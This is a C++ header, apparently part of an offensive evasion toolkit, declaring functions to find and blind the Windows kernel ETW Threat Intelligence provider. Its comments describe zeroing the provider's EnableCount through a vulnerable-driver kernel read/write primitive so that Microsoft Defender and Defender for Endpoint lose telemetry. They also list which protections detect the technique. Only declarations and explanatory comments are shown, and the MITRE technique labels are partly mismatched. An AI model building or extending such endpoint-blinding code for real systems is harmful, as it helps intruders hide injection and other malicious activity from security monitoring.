#pragma once
#ifndef ETWTIBLIND_H
#define ETWTIBLIND_H
#include "common.h"
#include "BYOVD.h"

// ETWTiBlind — disable ETW-Ti (ETW Threat Intelligence provider) via kernel patch.
// MITRE T1562.006 — Impair Defenses: Disable or Modify Linux Audit System.
// (Windows equivalent: T1562.006 is the closest — "disable security audit system")
//
// ETW-Ti is the KERNEL-SIDE ETW provider that feeds Microsoft Defender,
// MDE (Defender for Endpoint), and WMI-based security products with telemetry
// about process injection, memory allocation, and syscall behavior.
//
// Unlike user-mode ETW patching (which we already do in Evasion::PatchEtw()),
// ETW-Ti runs in kernel mode and is NOT affected by user-mode patches.
//
// ETW-Ti blind technique:
//   The ETW provider registration is stored in a PROVIDER_GROUP node in
//   kernel memory. The EnableInfo field controls whether events are generated.
//   By zeroing the EnableCount of the EtwThreatIntProvRegHandle registration,
//   we disable event generation from within the kernel provider.
//
// Alternatively (simpler): patch the TRACE_ENABLE_INFO structure referenced
// by EtwThreatIntProvRegHandle.RegIndex. Setting EnableCount=0 stops events
// without a full unregistration (which would be noisier).
//
// Requires: BYOVD kernel R/W (call BYOVD::LoadDriver first).
//
// What even stronger detectors catch:
//   - PatchGuard monitoring of certain EtwpRegistration structures
//   - MDE has a kernel callback for ETW-Ti re-registration (auto-repairs)
//   - Hardware-assisted hypervisor monitoring (Hyper-V VSM / Credential Guard)
//   - Intel PT traces show the kernel write sequence
//
// MITRE T1562.006 (Impair Defenses: Audit System)

namespace ETWTiBlind {
    // Find EtwThreatIntProvRegHandle in ntoskrnl .data section.
    DWORD64 FindEtwTiRegHandle(HANDLE hDev);

    // Blind ETW-Ti by zeroing the EnableCount in the provider registration.
    // Returns diagnostic string with before/after state.
    std::string Blind(HANDLE hDev);

    // Restore ETW-Ti (set EnableCount back to 1).
    std::string Restore(HANDLE hDev);

    // Check current ETW-Ti state.
    std::string CheckState(HANDLE hDev);
}

#endif
